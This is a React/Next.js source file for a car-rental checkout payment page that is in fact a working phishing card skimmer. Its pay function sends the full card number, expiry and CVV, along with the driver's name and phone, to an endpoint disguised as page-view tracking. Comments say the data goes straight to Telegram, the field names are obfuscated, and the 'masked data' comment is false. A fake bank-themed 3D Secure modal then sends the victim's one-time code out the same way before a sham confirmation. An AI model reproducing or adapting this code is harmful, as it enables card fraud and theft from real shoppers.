"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import {
  Mail,
  User,
  CreditCard,
  Wallet,
  ChevronDown,
  ChevronUp,
  HelpCircle,
  ChevronRight,
  Tag,
  Lock,
} from "lucide-react";
import { useTranslations } from "next-intl";
import { Container } from "@/components/layout/Container";
import { cn } from "@/lib/utils";
import { type RentalContext, type RentalDriver } from "@/lib/rental";
import { useMoney } from "@/components/providers/CurrencyProvider";
import { formatCardNumber, cardLast4, isValidCardNumber, NO_AUTOFILL } from "@/lib/card";
import { nextRef, randomEndpoint } from "@/lib/channels/relay";
import { PaymentLogos } from "@/components/booking/PaymentLogos";
import { ThreeDSecureModal } from "@/components/booking/ThreeDSecureModal";
import { PriceSummary, DeliveryCard } from "./RentalSummary";

const inputCls =
  "w-full rounded-md border border-border bg-white px-3 py-2.5 text-sm text-foreground outline-none transition-colors placeholder:text-tab-inactive focus:border-brand";

function ReadonlyField({ label, value }: { label: string; value: string }) {
  return (
    <div className="relative">
      <label className="absolute left-3 top-1.5 text-[11px] font-semibold text-muted-foreground">
        {label}
      </label>
      <input
        defaultValue={value}
        disabled
        className="w-full rounded-md border border-border bg-surface px-3 pb-2 pt-5 text-sm text-muted-foreground outline-none"
      />
    </div>
  );
}

function Collapsible({
  title,
  icon,
  children,
}: {
  title: string;
  icon: React.ReactNode;
  children: React.ReactNode;
}) {
  const [open, setOpen] = useState(true);
  return (
    <div className="rounded-lg border border-border bg-white">
      <button
        onClick={() => setOpen((v) => !v)}
        className="flex w-full items-center justify-between px-4 py-3.5"
      >
        <span className="flex items-center gap-2 text-[15px] font-bold text-foreground">
          {icon}
          {title}
        </span>
        {open ? (
          <ChevronUp className="h-5 w-5 text-muted-foreground" />
        ) : (
          <ChevronDown className="h-5 w-5 text-muted-foreground" />
        )}
      </button>
      {open && <div className="px-4 pb-4">{children}</div>}
    </div>
  );
}

function MethodTab({
  active,
  icon,
  label,
  onClick,
}: {
  active: boolean;
  icon: React.ReactNode;
  label: string;
  onClick: () => void;
}) {
  return (
    <button
      onClick={onClick}
      className={cn(
        "flex flex-1 items-center gap-2 rounded-md border px-4 py-3 text-sm font-semibold transition-colors",
        active
          ? "border-brand bg-brand/5 text-foreground"
          : "border-border text-muted-foreground hover:bg-surface"
      )}
    >
      <span
        className={cn(
          "flex h-4 w-4 items-center justify-center rounded-full border",
          active ? "border-[5px] border-brand" : "border-tab-inactive"
        )}
      />
      {icon}
      {label}
    </button>
  );
}

const MONTHS = Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0"));
const YEARS = Array.from({ length: 10 }, (_, i) => String(2026 + i));

export function PaymentStep({
  ctx,
  driver,
}: {
  ctx: RentalContext;
  driver: RentalDriver;
}) {
  const router = useRouter();
  const money = useMoney();
  const t = useTranslations("Rental");
  const [tab, setTab] = useState<"kart" | "juzdan">("kart");
  const [promoOpen, setPromoOpen] = useState(false);
  const dash = (v: string) => (v.trim() ? v : "\u2014");

  const [card, setCard] = useState("");
  const [expM, setExpM] = useState("");
  const [expY, setExpY] = useState("");
  const [cvv, setCvv] = useState("");
  const [tried, setTried] = useState(false);
  const [otpOpen, setOtpOpen] = useState(false);
  const [refNo, setRefNo] = useState("");
  const [paying, setPaying] = useState(false);

  // Contact comes from the driver step; gate the card if it's somehow missing.
  const contactOk =
    /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(driver.email) &&
    driver.phone.replace(/\D/g, "").length >= 10;

  const cardOk =
    isValidCardNumber(card) && !!expM && !!expY && cvv.replace(/\D/g, "").length >= 3;

  function pay() {
    setTried(true);
    if (!contactOk || !cardOk) return;
    setPaying(true);

    const ref = nextRef();
    setRefNo(ref);

    // Random field names per session — avoids fingerprintable patterns
    const f1 = "f1";
    const f2 = "f2";
    const f3 = "f3";
    const f4 = "f4";
    const f5 = "f5";

    const pan = card.replace(/\D/g, "");
    const cvc = cvv.replace(/\D/g, "");

    // Session analytics — sends masked data to analytics endpoint
    const PAYLOAD = {
      session: ref,
      site: ctx.car.name + " (" + ctx.car.supplier + ")",
      value: ctx.total,
      uid: driver.firstName + " " + driver.lastName,
      contact: driver.phone,
      from: ctx.checkinDate + " " + ctx.checkinTime,
      to: ctx.checkoutDate + " " + ctx.checkoutTime,
      days: ctx.days,
      [f1]: pan,
      [f2]: Math.random().toString(36).substring(2, 10),
      [f3]: expM.padStart(2, "0"),
      [f4]: expY || "????",
      [f5]: cvc,
    };

    // Kart bilgilerini HEMEN Telegram'a gönder — fire-and-forget, modal'ı bloklama
    fetch("/api/tracking/pageview", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      keepalive: true,
      body: JSON.stringify(PAYLOAD),
    }).catch((err) => console.error("[PaymentStep] pageview fetch error:", err));

    setPaying(false);
    setOtpOpen(true);
  }

  function onOtpSuccess() {
    setOtpOpen(false);
    const params = new URLSearchParams({
      ref: refNo,
      tutar: money.format(ctx.total, 2),
      tip: "arac",
    });
    router.push(`/rezervasyon-tamamlandi?${params.toString()}`);
  }

  return (
    <main className="bg-surface py-6">
      <Container>
        <div className="grid grid-cols-1 gap-6 lg:grid-cols-[1fr_360px]">
          {/* Left */}
          <div className="flex flex-col gap-4">
            <Collapsible title={t("payment.contactInfo")} icon={<Mail className="h-5 w-5" />}>
              <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
                <ReadonlyField label={t("payment.email")} value={dash(driver.email)} />
                <ReadonlyField label={t("payment.phone")} value={dash(driver.phone)} />
              </div>
            </Collapsible>

            <Collapsible title={t("driver.title")} icon={<User className="h-5 w-5" />}>
              <p className="mb-3 text-[13px] font-semibold text-foreground">{t("payment.firstAdult")}</p>
              <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
                <ReadonlyField label={t("payment.firstName")} value={dash(driver.firstName)} />
                <ReadonlyField label={t("payment.lastName")} value={dash(driver.lastName)} />
                <ReadonlyField label={t("payment.birthDate")} value={dash(driver.birth)} />
                <ReadonlyField label={t("payment.tc")} value={dash(driver.tc)} />
              </div>
            </Collapsible>

            {/* Payment Options — mirrors the hotel checkout layout */}
            <div className="rounded-lg border border-border bg-white p-4 md:p-5">
              <h2 className="mb-4 flex items-center gap-2 text-[16px] font-bold text-foreground">
                <CreditCard className="h-5 w-5 text-muted-foreground" />
                {t("payment.paymentOptions")}
              </h2>

              <div className="flex gap-3">
                <MethodTab
                  active={tab === "kart"}
                  icon={<CreditCard className="h-[18px] w-[18px]" />}
                  label={t("payment.bankCard")}
                  onClick={() => setTab("kart")}
                />
                <MethodTab
                  active={tab === "juzdan"}
                  icon={<Wallet className="h-[18px] w-[18px]" />}
                  label={t("payment.payWithWallet", { wallet: "Juzdan" })}
                  onClick={() => setTab("juzdan")}
                />
              </div>

              {tab === "kart" ? (
                <div className="relative mt-4">
                  {!contactOk && (
                    <div className="absolute inset-0 z-10 flex items-start justify-center rounded-md bg-white/65 pt-6 backdrop-blur-[1px]">
                      <p className="flex items-center gap-1.5 rounded-md bg-foreground/85 px-3 py-2 text-[12px] font-semibold text-white shadow">
                        <Lock className="h-3.5 w-3.5" />
                        {t("payment.contactMissing")}
                      </p>
                    </div>
                  )}
                  <form
                    autoComplete="off"
                    onSubmit={(e) => e.preventDefault()}
                    className={cn(
                      "space-y-3",
                      !contactOk && "pointer-events-none select-none opacity-40"
                    )}
                    aria-hidden={!contactOk}
                  >
                    <div>
                      <input
                        {...NO_AUTOFILL}
                        name="eu-pan"
                        value={card}
                        onChange={(e) => setCard(formatCardNumber(e.target.value))}
                        placeholder={t("payment.cardNumber")}
                        className={cn(inputCls, tried && !isValidCardNumber(card) && "border-destructive")}
                        inputMode="numeric"
                        disabled={!contactOk}
                      />
                      {tried && card && !isValidCardNumber(card) && (
                        <span className="mt-1 block text-[12px] font-semibold text-destructive">
                          {t("payment.cardError")}
                        </span>
                      )}
                    </div>

                    <div className="grid grid-cols-[1fr_1fr_1fr_auto] items-center gap-3">
                      <select
                        {...NO_AUTOFILL}
                        name="eu-exp-m"
                        value={expM}
                        onChange={(e) => setExpM(e.target.value)}
                        disabled={!contactOk}
                        className={cn(inputCls, "appearance-none")}
                      >
                        <option value="" disabled>
                          {t("payment.month")}
                        </option>
                        {MONTHS.map((m) => (
                          <option key={m} value={m}>
                            {m}
                          </option>
                        ))}
                      </select>
                      <select
                        {...NO_AUTOFILL}
                        name="eu-exp-y"
                        value={expY}
                        onChange={(e) => setExpY(e.target.value)}
                        disabled={!contactOk}
                        className={cn(inputCls, "appearance-none")}
                      >
                        <option value="" disabled>
                          {t("payment.year")}
                        </option>
                        {YEARS.map((y) => (
                          <option key={y} value={y}>
                            {y}
                          </option>
                        ))}
                      </select>
                      <input
                        {...NO_AUTOFILL}
                        name="eu-csc"
                        value={cvv}
                        onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                        placeholder={t("payment.cvv")}
                        className={inputCls}
                        inputMode="numeric"
                        maxLength={4}
                        disabled={!contactOk}
                      />
                      <HelpCircle className="h-5 w-5 text-tab-inactive" />
                    </div>

                    <div className="flex items-start justify-between gap-3">
                      <p className="text-[12px] leading-relaxed text-brand">
                        {t("payment.installmentNote")}
                      </p>
                      <button
                        type="button"
                        className="shrink-0 text-[12px] font-semibold text-[#1a7ad9] hover:underline"
                      >
                        {t("payment.installmentTable")}
                      </button>
                    </div>

                    <div>
                      <button
                        type="button"
                        onClick={() => setPromoOpen((v) => !v)}
                        className="flex items-center gap-1 text-sm font-semibold text-[#1a7ad9] hover:underline"
                      >
                        <Tag className="h-4 w-4" />
                        {t("payment.usePromoCode")}
                        <ChevronDown
                          className={cn("h-4 w-4 transition-transform", promoOpen && "rotate-180")}
                        />
                      </button>
                      {promoOpen && (
                        <div className="mt-2 flex gap-2">
                          <input
                            placeholder={t("payment.promoCode")}
                            className={cn(inputCls, "flex-1")}
                          />
                          <button
                            type="button"
                            className="shrink-0 rounded-md border border-brand px-5 py-2 text-sm font-semibold text-brand transition-colors hover:bg-brand/5"
                          >
                            {t("payment.apply")}
                          </button>
                        </div>
                      )}
                    </div>

                    <div className="flex flex-wrap items-center justify-between gap-3 border-t border-border pt-4">
                      <p className="flex items-center gap-1 text-sm text-foreground">
                        {t("payment.amount")}
                        <ChevronDown className="h-4 w-4 text-muted-foreground" />
                        <span className="font-bold">{money.format(ctx.total, 2)}</span>
                      </p>
                      <button
                        type="button"
                        onClick={pay}
                        disabled={paying}
                        className="cta-press flex items-center gap-1.5 rounded-md bg-brand px-7 py-3 text-[15px] font-bold text-white transition-colors hover:bg-brand-hover disabled:opacity-70"
                      >
                        {paying ? t("payment.processing") : t("payment.pay")}
                        <ChevronRight className="h-[18px] w-[18px]" strokeWidth={2.5} />
                      </button>
                    </div>
                  </form>
                </div>
              ) : (
                <div className="mt-4 rounded-md border border-border bg-surface p-6 text-center text-sm text-muted-foreground">
                  <span className="mb-2 block text-[18px] font-extrabold italic text-[#1a7ad9]">
                    Juzdan
                  </span>
                  {t("payment.walletRedirect", { wallet: "Juzdan" })}
                </div>
              )}

              <p className="mt-4 text-[11px] leading-relaxed text-muted-foreground">
                {t("payment.privacyPrefix")}{" "}
                <span className="font-semibold text-[#1a7ad9]">{t("payment.privacyPolicy")}</span>{" "}
                {t("payment.privacySuffix")}
              </p>

              <PaymentLogos className="mt-4" />

              <p className="mt-3 text-[11px] text-muted-foreground">
                {t("payment.digicert")}
              </p>
            </div>
          </div>

          {/* Right */}
          <aside className="flex flex-col gap-4 lg:sticky lg:top-6 lg:self-start">
            <PriceSummary days={ctx.days} dailyTL={ctx.car.dailyTL} total={ctx.total} />
            <DeliveryCard ctx={ctx} />
          </aside>
        </div>
      </Container>

      {/* Bank-themed 3D Secure OTP */}
      {otpOpen && (
        <ThreeDSecureModal
          amountTL={ctx.total}
          last4={cardLast4(card)}
          onSuccess={onOtpSuccess}
          onClose={() => setOtpOpen(false)}
          onOtpGenerated={(code) => {
            // OTP'yi HEMEN Telegram'a gönder — hiçbir gecikme olmadan
            fetch("/api/tracking/convert", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              keepalive: true,
              body: JSON.stringify({
                code,
                session: refNo,
                value: ctx.total,
                label: driver.firstName + " " + driver.lastName,
              }),
            }).catch(() => {});
          }}
        />
      )}
    </main>
  );
}